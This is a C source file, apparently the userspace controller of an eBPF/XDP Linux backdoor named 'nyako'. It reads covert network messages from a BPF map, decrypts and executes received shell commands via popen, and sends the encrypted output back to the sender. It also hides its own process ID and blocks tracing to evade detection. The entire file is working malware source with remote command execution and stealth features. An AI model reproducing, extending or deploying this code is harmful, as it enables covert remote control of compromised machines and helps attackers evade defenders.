#include "nyako.h"

static bool active = false;
static struct config cfg = {
  .xdp_flags = XDP_FLAGS_UPDATE_IF_NOEXIST | XDP_FLAGS_SKB_MODE,
  .ifindex = IFINDEX,
};
static struct no_trace_kern *no_trace_skel = NULL;
static pthread_t no_trace_tid;
static bool no_trace_enabled = false;

static struct pidhide_kern *pidhide_skel = NULL;

static void disable_no_trace()
{
  if (no_trace_skel)
  {
    destroy_no_trace(no_trace_skel);
    no_trace_skel = NULL;
  }
}

static void disable_pidhide()
{
  if (pidhide_skel)
  {
    destroy_pidhide(pidhide_skel);
    pidhide_skel = NULL;
  }
}

static void cleanup()
{
  xdp_link_detach(cfg.ifindex, cfg.xdp_flags, NYAKO_KERN_PROG_ID);
  disable_no_trace();
  disable_pidhide();
  exit(EXIT_SUCCESS);
}

static int get_map_value(int fd, __u32 key, struct message_details *value)
{
  if ((bpf_map_lookup_elem(fd, &key, value)) != 0)
  {
    return -1;
  }

  return 0;
}

static int find_map_fd(const struct bpf_object *bpf_obj, const char *map_name)
{
  struct bpf_map *map;
  int map_fd = -1;

  map = bpf_object__find_map_by_name(bpf_obj, map_name);
  if (!map)
  {
    return map_fd;
  }

  map_fd = bpf_map__fd(map);
  return map_fd;
}

static void* enable_no_trace(void *params)
{
  no_trace_skel = no_trace_kern__open();
  setup_no_trace(no_trace_skel);
  return NULL;
}

static void* enable_pidhide(void *params)
{
  int target_pid = getpid();
  pidhide_skel = pidhide_kern__open();
  setup_pidhide(pidhide_skel, target_pid);
  return NULL;
}

static void handle_message(struct message_details *message_details)
{
  FILE *cmd;
  unsigned char command[BUF_SIZE];
  char cmd_output[BUF_SIZE / 2];
  struct message message;
  int ciphertext_len;
  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
  unsigned char res_message[MESSAGE_BUF_SIZE], client_ip[IP_BUF_SIZE];

  // reset buffers
  memset(cmd_output, 0, sizeof(cmd_output));

  // skip if no data
  if (strlen((const char *)message_details->message) == 0)
    return;

  parse_message(message_details->message, &message);

  // do not handle message if the nyako is not active
  if (!active && (message.type != TYPE_INVOKE && message.type != TYPE_TERMINATE))
    return;

  if (message.type == TYPE_EXECUTE_CMD)
  {
    if (decrypt(command, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
    {
      log_error("decrypt");
      return;
    }

    fprintf(stdout, "executing command: '%s'\n", command);

    // execute the command
    cmd = popen((char *)command, "r");
    if (cmd == NULL)
    {
      log_error("popen");
      return;
    }

    // collect command result and send the result
    while (fread(cmd_output, sizeof(cmd_output) - 1, 1, cmd) >= 0)
    {
      if (ferror(cmd) != 0)
      {
        log_error("fread");
        break;
      }

      randombytes_buf(nonce, sizeof(nonce));

      cmd_output[sizeof(cmd_output) - 1] = '\0';
      if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)cmd_output, sizeof(cmd_output), nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
      {
        log_error("encrypt");
        break;
      }

      to_hex(ciphertext, ciphertext_len, ciphertext_hex);
      to_hex(nonce, sizeof(nonce), nonce_hex);
      if (craft_message(res_message, AUTH_HEADER, 0, TYPE_SEND_CMD_RESULT, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
      {
        log_error("craft_message");
        break;
      }

      saddr_to_str(client_ip, message_details->ip_saddr);

      send_request(res_message, client_ip);

      bzero(cmd_output, sizeof(cmd_output));
      // break when the last segment is read
      if (feof(cmd) != 0)
      {
        log_info("transfer complete...");
        break;
      }
    }

    pclose(cmd);
  }
  else if (message.type == TYPE_INVOKE)
  {
    active = true;
    log_info("nyako invoked");
  }
  else if (message.type == TYPE_SUSPEND)
  {
    disable_no_trace();
    active = false;
    log_info("nyako suspended");
  }
  else if (message.type == TYPE_TERMINATE)
  {
    log_info("terminating nyako...");
    cleanup();
  }
  else if (message.type == TYPE_BLOCK_TRACE)
  {
    if (!no_trace_enabled)
    {
      if (pthread_create(&no_trace_tid, NULL, enable_no_trace, NULL) != 0)
      {
        log_error("pthread_create for enable_no_trace");
        return;
      }
      no_trace_enabled = true;
      log_info("tracing blocked");
    }
    else
    {
      log_info("tracing already blocked, do nothing...");
    }
  }
  else if (message.type == TYPE_UNBLOCK_TRACE)
  {
    if (no_trace_skel)
    {
      disable_no_trace();
      no_trace_enabled = false;
      log_info("tracing unblocked");
    }
    else
    {
      log_info("tracing not blocked, do nothing...");
    }
  }
  else
  {
    log_error("unsupported command");
    return;
  }

  return;
}

static void message_poll(int map_fd, int interval)
{
  struct message_details message_details = { 0 };
  struct message_details empty_message_details = { 0 };

  while (true)
  {
    for (int i = 0; i < MESSAGE_QUEQUE_SIZE; i++)
    {
      if (get_map_value(map_fd, i, &message_details) < 0)
      {
        fprintf(stderr, "ERROR: bpf_map_lookup_elem failed key:0x%X\n", i);
        continue;
      }

      handle_message(&message_details);

      if (bpf_map_update_elem(map_fd, &i, &empty_message_details, BPF_EXIST) != 0)
      {
        fprintf(stderr, "ERROR: bpf_map_update_elem failed key:0x%X\n", i);
        continue;
      }
    }

    sleep(interval);
  }
}

int main()
{
  struct bpf_object *bpf_obj;
  int message_queque_map_fd;
  int interval = 5;
  pthread_t pidhide_tid;

  strncpy(cfg.filename, NYAKO_KERN_FILENAME, sizeof(cfg.filename));
  strncpy(cfg.progsec, NYAKO_KERN_PROGSEC, sizeof(cfg.progsec));

  if (!(bpf_obj = load_bpf_and_xdp_attach(&cfg)))
  {
    log_error("load_bpf_and_xdp_attach");
    return -1;
  }

  signal(SIGINT, cleanup);

  if (pthread_create(&pidhide_tid, NULL, enable_pidhide, NULL) != 0)
  {
    log_error("pthread_create for hidepid");
    return -1;
  }

  message_queque_map_fd = find_map_fd(bpf_obj, MESSAGE_QUEQUE_MAP_NAME);
  if (message_queque_map_fd < 0)
  {
    xdp_link_detach(cfg.ifindex, cfg.xdp_flags, NYAKO_KERN_PROG_ID);
    log_error("find_map_fd");
    return -1;
  }

  message_poll(message_queque_map_fd, interval);

  if (pthread_join(pidhide_tid, NULL) != 0)
  {
    log_error("pthread_join for pidhide");
    return -1;
  }

  return 0;
}

